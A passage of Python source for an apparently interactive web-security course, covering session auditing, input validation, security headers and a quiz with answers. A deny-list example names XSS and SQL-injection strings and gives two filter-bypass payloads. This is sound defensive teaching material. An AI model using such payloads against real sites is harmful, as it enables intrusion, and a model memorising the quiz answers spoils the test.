        '    print(f"    HttpOnly: {bool(cookie.has_nonstandard_attr(\'HttpOnly\'))}")\n'
        '    print(f"    Secure: {cookie.secure}")\n'
        '    print(f"    SameSite: {cookie.get_nonstandard_attr(\'SameSite\', \'Not set\')}")',
        "python"
    )
    pace()

    press_enter()

    # ── Scenario ──
    scenario_block(
        "GitHub OAuth Session Fixation (2014)",
        "A security researcher discovered that GitHub's OAuth flow was vulnerable "
        "to a session fixation-like attack. By manipulating the OAuth state "
        "parameter, an attacker could link their own GitHub account to a victim's "
        "third-party service account. GitHub fixed the issue by properly validating "
        "the state parameter and tying it to the user's session."
    )
    pace()

    # ── Practice challenge ──
    sub_header("Practice Challenge: Audit the Vulnerable App's Auth")
    info("1. Test the login page for brute-force vulnerability (no lockout).")
    info("2. Check if the session ID changes after login (session fixation test).")
    info("3. Inspect the session cookie for HttpOnly and Secure flags.")
    info("4. Test if logging out actually invalidates the session.")
    print()
    hint_text("Use browser DevTools (Application > Cookies) to inspect cookie flags.")
    hint_text("Save the session cookie, log out, then try using the old cookie.")

    if ask_yes_no("Did you complete the authentication audit?"):
        success("Great job! Authentication security is fundamental to web app safety.")
        mark_lesson_complete(progress, module_key, "auth_session")
        mark_challenge_complete(progress, module_key, "auth_audit_challenge")
    else:
        info("No worries — this is a detailed exercise. Return any time.")

    press_enter()


# ─────────────────────────────────────────────────────────────────────────────
# Lesson 5 — Input Validation & Security Headers
# ─────────────────────────────────────────────────────────────────────────────

def lesson_input_val_headers(progress, module_key):
    section_header("Lesson 5: Input Validation & Security Headers")
    learning_goal([
        "Learn whitelist vs blacklist validation",
        "Build multi-layer input validation",
        "Understand essential security headers and how to set them",
    ])
    disclaimer()

    lesson_block(
        "Input validation ensures that user-supplied data conforms to expected "
        "formats before processing it. Security headers tell browsers to enable "
        "protective mechanisms."
    )
    lesson_block(
        "Together, they form two critical layers of defense for any web app."
    )

    why_it_matters(
        "Most web vulnerabilities -- SQLi, XSS, command injection -- exploit "
        "insufficient input validation. Security headers are a free, easy-to-add "
        "defense layer. Compliance frameworks like PCI DSS and SOC 2 check for both."
    )

    pace()
    press_enter()

    # ── Whitelist vs Blacklist ──
    sub_header("Whitelist vs. Blacklist Validation")
    lesson_block(
        "Blacklist (deny-list) validation tries to block known-bad input, like "
        "filtering out <script> tags. This is fragile because attackers constantly "
        "find bypasses."
    )
    lesson_block(
        "Whitelist (allow-list) validation defines exactly what IS allowed and "
        "rejects everything else. Whitelisting is always preferred."
    )
    tip("Think: 'only allow good input' instead of 'try to block bad input'.")
    pace()

    code_block(
        'import re\n'
        '\n'
        '# BAD: Blacklist approach — easily bypassed\n'
        'def sanitize_blacklist(user_input):\n'
        '    """Remove known-bad patterns — FRAGILE!"""\n'
        '    blacklist = ["<script>", "DROP TABLE", "OR 1=1", "UNION SELECT"]\n'
        '    cleaned = user_input\n'
        '    for bad in blacklist:\n'
        '        cleaned = cleaned.replace(bad, "")\n'
        '    return cleaned\n'
        '    # Bypass: <scr<script>ipt>  or  OR/**/1=1',
        "python"
    )
    pace()

    code_block(
        '# GOOD: Whitelist approach — only allow expected patterns\n'
        'def validate_username(username):\n'
        '    """Allow only alphanumeric characters and underscores, 3-30 chars."""\n'
        '    if re.match(r"^[a-zA-Z0-9_]{3,30}$", username):\n'
        '        return username\n'
        '    raise ValueError("Invalid username format")\n'
        '\n'
        'def validate_email(email):\n'
        '    """Basic email format validation."""\n'
        '    pattern = r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$"\n'
        '    if re.match(pattern, email):\n'
        '        return email\n'
        '    raise ValueError("Invalid email format")',
        "python"
    )
    pace()

    code_block(
        'def validate_age(age_str):\n'
        '    """Accept only integers in a reasonable range."""\n'
        '    age = int(age_str)  # Raises ValueError if not an integer\n'
        '    if 0 <= age <= 150:\n'
        '        return age\n'
        '    raise ValueError("Age out of range")',
        "python"
    )
    pace()

    press_enter()

    # ── Comprehensive input validation ──
    sub_header("Comprehensive Input Validation Strategy")
    lesson_block(
        "Effective input validation operates at multiple levels: (1) Client-side "
        "for user experience (but NEVER for security). (2) Server-side for all "
        "data before processing. (3) Database-level constraints as a safety net."
    )
    tip("Always validate type, length, format, and range.")
    pace()

    code_block(
        'from flask import Flask, request, abort\n'
        'import re\n'
        '\n'
        'app = Flask(__name__)\n'
        '\n'
        'def validate_search_query(query):\n'
        '    """Multi-layer input validation for search."""\n'
        '    # 1. Type check\n'
        '    if not isinstance(query, str):\n'
        '        raise ValueError("Query must be a string")\n'
        '\n'
        '    # 2. Length check\n'
        '    if len(query) > 200:\n'
        '        raise ValueError("Query too long")\n'
        '\n'
        '    # 3. Character whitelist\n'
        '    if not re.match(r"^[a-zA-Z0-9\\s\\-]+$", query):\n'
        '        raise ValueError("Query contains invalid characters")\n'
        '\n'
        '    return query.strip()',
        "python"
    )
    pace()

    code_block(
        '@app.route("/search")\n'
        'def search():\n'
        '    raw_query = request.args.get("q", "")\n'
        '    try:\n'
        '        clean_query = validate_search_query(raw_query)\n'
        '    except ValueError as e:\n'
        '        abort(400, description=str(e))\n'
        '    # Now safe to use clean_query in a parameterized query\n'
        '    results = db.execute("SELECT * FROM products WHERE name LIKE ?",\n'
        '                         (f"%{clean_query}%",))\n'
        '    return render_template("results.html", results=results)',
        "python"
    )

    nice_work("You understand input validation -- now let's look at security headers!")
    pace()
    press_enter()

    # ── Security Headers ──
    sub_header("Essential Security Headers")

    info(f"{BRIGHT}1. Content-Security-Policy (CSP){RESET}")
    lesson_block(
        "CSP controls which resources the browser is allowed to load. A strict "
        "CSP can prevent inline scripts from executing, even if an attacker "
        "injects them into the page."
    )
    code_block(
        "# Strict CSP header — only allow resources from the same origin\n"
        "Content-Security-Policy: default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data:; "
        "font-src 'self'; "
        "connect-src 'self'; "
        "frame-ancestors 'none'",
        "http"
    )
    pace()

    info(f"{BRIGHT}2. Strict-Transport-Security (HSTS){RESET}")
    lesson_block(
        "HSTS tells the browser to ONLY communicate over HTTPS, even if the "
        "user types http://. This prevents SSL-stripping attacks."
    )
    code_block(
        "# HSTS header — enforce HTTPS for 1 year, include subdomains\n"
        "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
        "http"
    )
    pace()

    press_enter()

    info(f"{BRIGHT}3. X-Frame-Options{RESET}")
    lesson_block(
        "X-Frame-Options prevents your page from being embedded in an iframe, "
        "defending against clickjacking attacks."
    )
    code_block(
        "# Prevent any framing of your page\n"
        "X-Frame-Options: DENY\n"
        "\n"
        "# Allow framing only from the same origin\n"
        "X-Frame-Options: SAMEORIGIN",
        "http"
    )
    pace()

    info(f"{BRIGHT}4. X-Content-Type-Options{RESET}")
    lesson_block(
        "This header prevents browsers from MIME-type sniffing, which can cause "
        "security issues when a browser interprets a file differently than intended."
    )
    code_block(
        "X-Content-Type-Options: nosniff",
        "http"
    )
    pace()

    info(f"{BRIGHT}5. Referrer-Policy{RESET}")
    lesson_block(
        "Controls how much referrer information is sent with requests. A strict "
        "policy prevents leaking sensitive URL paths to third-party sites."
    )
    code_block(
        "# Only send origin (no path) for cross-origin requests\n"
        "Referrer-Policy: strict-origin-when-cross-origin",
        "http"
    )

    nice_work("You now know the five essential security headers!")
    pace()
    press_enter()

    # ── Setting headers in Flask ──
    sub_header("Setting Security Headers in Flask")
    lesson_block("Here is how to add all the headers at once using Flask's after_request hook:")
    code_block(
        'from flask import Flask\n'
        '\n'
        'app = Flask(__name__)\n'
        '\n'
        '@app.after_request\n'
        'def set_security_headers(response):\n'
        '    """Add security headers to every response."""\n'
        '    response.headers["Content-Security-Policy"] = (\n'
        '        "default-src \'self\'; script-src \'self\'; "\n'
        '        "style-src \'self\' \'unsafe-inline\'; "\n'
        '        "frame-ancestors \'none\'"\n'
        '    )\n'
        '    response.headers["Strict-Transport-Security"] = (\n'
        '        "max-age=31536000; includeSubDomains"\n'
        '    )',
        "python"
    )
    pace()

    code_block(
        '    response.headers["X-Frame-Options"] = "DENY"\n'
        '    response.headers["X-Content-Type-Options"] = "nosniff"\n'
        '    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"\n'
        '    response.headers["Permissions-Policy"] = (\n'
        '        "geolocation=(), microphone=(), camera=()"\n'
        '    )\n'
        '    # Remove server header to reduce fingerprinting\n'
        '    response.headers.pop("Server", None)\n'
        '    return response',
        "python"
    )
    tip("You can copy this pattern into any Flask app for instant security improvement.")
    pace()

    press_enter()

    # ── How to check headers ──
    sub_header("How to Check Security Headers")
    lesson_block(
        "You can check security headers using command-line tools, Python, or "
        "online scanners."
    )

    code_block(
        '# Method 1: curl from the command line\n'
        '# curl -I https://example.com\n'
        '\n'
        '# Method 2: Python script to audit headers\n'
        'import requests\n'
        '\n'
        'REQUIRED_HEADERS = [\n'
        '    "Strict-Transport-Security",\n'
        '    "Content-Security-Policy",\n'
        '    "X-Content-Type-Options",\n'
        '    "X-Frame-Options",\n'
        '    "Referrer-Policy",\n'
        '    "Permissions-Policy",\n'
        ']',
        "python"
    )
    pace()

    code_block(
        'def audit_headers(url):\n'
        '    """Check a URL for security headers."""\n'
        '    resp = requests.get(url, timeout=10)\n'
        '    print(f"\\nHeaders for {url}:")\n'
        '    print("-" * 50)\n'
        '    for header in REQUIRED_HEADERS:\n'
        '        value = resp.headers.get(header)\n'
        '        if value:\n'
        '            print(f"  [PASS] {header}: {value[:60]}")\n'
        '        else:\n'
        '            print(f"  [FAIL] {header}: MISSING")\n'
        '    # Check for information disclosure\n'
        '    server = resp.headers.get("Server")\n'
        '    if server:\n'
        '        print(f"  [WARN] Server header present: {server}")\n'
        '\n'
        '# Test against the local vulnerable app\n'
        'audit_headers("http://localhost:5050")',
        "python"
    )
    pace()

    press_enter()

    # ── Scenario ──
    scenario_block(
        "Clickjacking Attack on Facebook (2009-2011)",
        "Multiple clickjacking attacks targeted Facebook by embedding the 'Like' "
        "button in invisible iframes on malicious websites. Unsuspecting users "
        "would click what appeared to be a play button or other UI element, but "
        "were actually clicking the hidden 'Like' button. Facebook eventually "
        "implemented X-Frame-Options: DENY and frame-busting JavaScript to prevent "
        "these attacks. This is a textbook example of why X-Frame-Options and CSP "
        "frame-ancestors matter."
    )
    pace()

    # ── Practice challenge ──
    sub_header("Practice Challenge: Header Audit")
    info("1. Run the header audit script above against http://localhost:5050")
    info("2. Note which security headers are missing.")
    info("3. Add the missing headers to the vulnerable app using @app.after_request")
    info("4. Run the audit again to verify all headers are present.")
    info("5. BONUS: Try the audit against a real website you own or administer.")
    print()
    hint_text("Start by adding one header at a time and testing after each addition.")
    hint_text("Online tool: securityheaders.com can also grade public sites.")

    if ask_yes_no("Did you complete the header audit and add the missing headers?"):
        success("Outstanding! Security headers are a quick win for any web app.")
        mark_lesson_complete(progress, module_key, "input_val_headers")
        mark_challenge_complete(progress, module_key, "header_audit_challenge")
    else:
        info("Come back after trying the audit. It only takes a few minutes.")

    press_enter()


# ─────────────────────────────────────────────────────────────────────────────
# Quiz
# ─────────────────────────────────────────────────────────────────────────────

def _run_quiz(progress, module_key):
    questions = [
        {
            "q": "Which OWASP Top 10 category moved to the #1 position in 2021?",
            "options": [
                "A) Injection",
                "B) Broken Access Control",
                "C) Cryptographic Failures",
                "D) Security Misconfiguration",
            ],
            "answer": "b",
            "explanation": (
                "Broken Access Control moved from #5 to #1 in the 2021 update, "
                "reflecting its prevalence in real-world applications."
            ),
        },
        {
            "q": "What is the PRIMARY defense against SQL injection?",
            "options": [
                "A) Input blacklisting (filtering out keywords like SELECT)",
                "B) Using a Web Application Firewall (WAF)",
                "C) Parameterized queries (prepared statements)",
                "D) Encoding output before display",
            ],
            "answer": "c",
            "explanation": (
                "Parameterized queries ensure user input is always treated as data, "
                "never as part of the SQL command. WAFs and blacklists can be bypassed."
            ),
        },
        {
            "q": "Which type of XSS is stored in the database and executes "
                 "for every user who views the affected page?",
            "options": [
                "A) Reflected XSS",
                "B) DOM-based XSS",
                "C) Stored (Persistent) XSS",
                "D) Self-XSS",
            ],
            "answer": "c",
            "explanation": (
                "Stored XSS persists on the server (e.g., in a database) and is "
                "served to every user who visits the affected page, making it the "
                "most dangerous type."
            ),
        },
        {
            "q": "What does the CSRF anti-pattern exploit?",
            "options": [
                "A) A vulnerability in the server's database",
                "B) The browser's automatic inclusion of cookies with requests",
                "C) Weak encryption algorithms",
                "D) Missing input validation on the client side",
            ],
            "answer": "b",
            "explanation": (
                "CSRF exploits the fact that browsers automatically include cookies "
                "(and thus session credentials) with every request to a site, even "
                "if the request was triggered from a different origin."
            ),
        },
        {
            "q": "Why is whitelist (allow-list) validation preferred over "
                 "blacklist (deny-list) validation?",
            "options": [
                "A) Whitelists are faster to implement",
                "B) Blacklists are impossible to maintain",
                "C) Whitelists define exactly what is allowed, making bypasses difficult",
                "D) Blacklists cannot filter HTML tags",
            ],
            "answer": "c",
            "explanation": (
                "Whitelists define precisely what input is acceptable and reject "
                "everything else. Blacklists try to enumerate all possible bad inputs, "
                "which is a losing battle as attackers find endless bypasses."
            ),
        },
        {
            "q": "What security header prevents a page from being loaded "
                 "inside an iframe (defending against clickjacking)?",
            "options": [
                "A) Content-Security-Policy",
                "B) Strict-Transport-Security",
                "C) X-Frame-Options",
                "D) X-Content-Type-Options",
            ],
            "answer": "c",
            "explanation": (
                "X-Frame-Options: DENY prevents the page from being framed, "
                "which is the primary defense against clickjacking. CSP's "
                "frame-ancestors directive is the modern replacement."
            ),
        },
        {
            "q": "What does HSTS (Strict-Transport-Security) tell the browser to do?",
            "options": [
                "A) Block all JavaScript execution",
                "B) Only communicate with the server over HTTPS",
                "C) Reject cookies without the Secure flag",
                "D) Prevent DNS resolution to non-HTTPS servers",
            ],
            "answer": "b",
            "explanation": (
                "HSTS instructs the browser to only connect to the site over HTTPS, "
                "even if the user types http://. This prevents SSL-stripping "
                "man-in-the-middle attacks."
            ),
        },
        {
            "q": "In a session fixation attack, what must the application do "
                 "to defend itself?",
            "options": [
                "A) Encrypt all cookies with AES-256",
                "B) Regenerate the session ID after successful authentication",
                "C) Store sessions in the URL instead of cookies",
                "D) Use longer session ID strings",
            ],
            "answer": "b",
            "explanation": (
                "Regenerating the session ID after login ensures that any "
                "pre-authentication session ID (which the attacker may know) "
                "becomes useless."
            ),
        },
    ]
    run_quiz(questions, "web_security_quiz", module_key, progress)
